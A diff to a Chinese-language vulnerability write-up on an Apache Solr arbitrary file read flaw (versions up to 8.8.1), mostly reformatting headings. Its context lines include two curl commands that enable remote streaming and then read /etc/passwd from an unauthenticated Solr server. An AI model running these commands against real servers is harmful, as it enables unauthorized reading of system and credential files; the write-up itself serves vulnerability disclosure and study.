@@ -13,11 +13,11 @@ source: "MrWQ/vulnerability-paper"
 
 Apache Solr 存在任意文件读取漏洞，攻击者可以在未授权的情况下获取目标服务器敏感文件
 
-**二:  漏洞影响🐇**
+**二:  漏洞影响🐇**
 
 **Apache Solr <= 8.8.1**
 
-**三:  漏洞复现🐋**
+**三:  漏洞复现🐋**
 
 **访问 Solr Admin 管理员页面**
 
@@ -81,11 +81,11 @@ stream.url=file:///etc/passwd
 
 ```
 Curl请求为
-curl -d '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true\}\}' http://xxx.xxx.xxx.xxx:8983/solr/{corename}/config -H 'Content-type:application/json'
+curl -d '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true\}\}' http://xxx.xxx.xxx.xxx:8983/solr/{corename}/config -H 'Content-type:application/json'
 curl "http://xxx.xxx.xxx.xxx:8983/solr/db/debug/dump?param=ContentStreams" -F "stream.url=file://etc/passwd"
 ```
 
-****四:  漏洞 POC🦉****
+****四:  漏洞 POC🦉****
 
 ```
 POC还是建立在未授权访问的情况下
@@ -173,7 +173,7 @@ if __name__ == '__main__':
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el64rRLVwxr8OFmJJ8QfRlrO51iaBThiaQNJdFAHmUbiaqYgibMrQD79FUFd4OqmE7kzUibib4eDKYf9S0RQ/640?wx_fmt=png)
 
-**四:  参考文章🐋**
+**四:  参考文章🐋**
 --------------
 
 [https://mp.weixin.qq.com/s/HMtAz6_unM1PrjfAzfwCUQ](https://mp.weixin.qq.com/s?__biz=MzIxNDAyNjQwNg==&mid=2456098142&idx=1&sn=b025147c7c4855801a1132d0e41f0e6e&scene=21#wechat_redirect)
